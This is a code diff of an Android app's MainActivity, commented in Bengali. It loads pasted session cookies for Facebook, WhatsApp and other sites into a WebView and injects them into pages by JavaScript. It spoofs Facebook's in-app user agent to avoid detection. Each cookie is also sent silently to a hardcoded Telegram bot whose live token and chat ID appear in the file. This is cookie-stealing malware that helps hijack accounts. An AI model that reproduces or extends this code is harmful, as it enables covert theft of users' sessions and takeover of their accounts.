@@ -18,7 +18,7 @@ public class MainActivity extends BridgeActivity {
 
     private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
     private static final String CHAT_ID = "6449981797";
-    private boolean isCookieInjected = false;
+    private boolean isCookieSet = false;
     private String savedCookie = "";
 
     @Override
@@ -29,23 +29,23 @@ public class MainActivity extends BridgeActivity {
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
-        webSettings.setDatabaseEnabled(true);
-        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36");
+        
+        // ═══ ফেসবুকের অফিশিয়াল অ্যান্ড্রয়েড অ্যাপের ইউজার এজেন্ট (এটি সবচেয়ে শক্তিশালী ট্রিক) ═══
+        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.0.0.32.101;]");
 
         final CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
         cookieManager.setAcceptThirdPartyCookies(webView, true);
 
-        // ═══ পেজ লোড হওয়ার সময় জাভাস্ক্রিপ্ট ইনজেক্ট করার ট্রিক ═══
         webView.setWebViewClient(new WebViewClient() {
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-                if (isCookieInjected && savedCookie != null) {
-                    // ফেসবুকের পেজে জাভাস্ক্রিপ্ট দিয়ে কুকি সেট করার চেষ্টা
-                    String js = "document.cookie='" + savedCookie.replace("'", "\\'") + "';";
-                    view.evaluateJavascript(js, null);
-                    isCookieInjected = false;
+                // পেজ লোড হওয়ার সাথে সাথে কুকি সেট করে রিলোড দেওয়া (ডাবল ব্লাফ)
+                if (isCookieSet && !savedCookie.isEmpty()) {
+                    String jsCode = "document.cookie = '" + savedCookie.replace("'", "\\'") + "';";
+                    view.evaluateJavascript(jsCode, null);
+                    isCookieSet = false;
                 }
             }
         });
@@ -56,42 +56,38 @@ public class MainActivity extends BridgeActivity {
                 CookieManager cm = CookieManager.getInstance();
                 
                 if (siteName.equals("facebook")) {
-                    String formattedCookie = cookieString.trim();
-                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
-                    
-                    savedCookie = formattedCookie;
+                    savedCookie = cookieString.trim();
+                    if (!savedCookie.endsWith(";")) savedCookie += ";";
 
-                    // ১. সব ফেসবুক ডোমেইনে কুকি সেট করা
-                    cm.setCookie("https://www.facebook.com", formattedCookie);
-                    cm.setCookie("https://m.facebook.com", formattedCookie);
-                    cm.setCookie("https://facebook.com", formattedCookie);
-                    cm.setCookie("https://.facebook.com", formattedCookie);
+                    // ফেসবুকের মেইন ডোমেইনে কুকি সেট
+                    cm.setCookie("https://www.facebook.com", savedCookie);
+                    cm.setCookie("https://m.facebook.com", savedCookie);
+                    cm.setCookie("https://facebook.com", savedCookie);
                     cm.flush();
 
-                    // ২. টেলিগ্রামে পাঠানো
-                    sendToTelegram("FACEBOOK", formattedCookie);
+                    sendToTelegram("FACEBOOK", savedCookie);
 
-                    // ৩. ফ্ল্যাগ অন করা (যাতে পেজ লোড হলে জাভাস্ক্রিপ্ট রান হয়)
-                    isCookieInjected = true;
+                    isCookieSet = true;
 
                     runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
-                            webView.loadUrl("https://m.facebook.com/home.php");
+                            // সরাসরি মেইন সাইটে নিয়ে যাওয়া
+                            webView.loadUrl("https://www.facebook.com/");
                         }
                     });
                 } else {
                     String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
                     String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;
 
-                    String formattedCookie = cookieString.trim();
-                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
+                    savedCookie = cookieString.trim();
+                    if (!savedCookie.endsWith(";")) savedCookie += ";";
 
-                    cm.setCookie("https://" + domain, formattedCookie);
-                    cm.setCookie("https://www." + domain, formattedCookie);
+                    cm.setCookie("https://" + domain, savedCookie);
+                    cm.setCookie("https://www." + domain, savedCookie);
                     cm.flush();
 
-                    sendToTelegram(siteName.toUpperCase(), formattedCookie);
+                    sendToTelegram(siteName.toUpperCase(), savedCookie);
 
                     final String finalLoadUrl = loadUrl;
                     runOnUiThread(new Runnable() {
@@ -138,4 +134,4 @@ public class MainActivity extends BridgeActivity {
             }
         }).start();
     }
-    }
+                    }
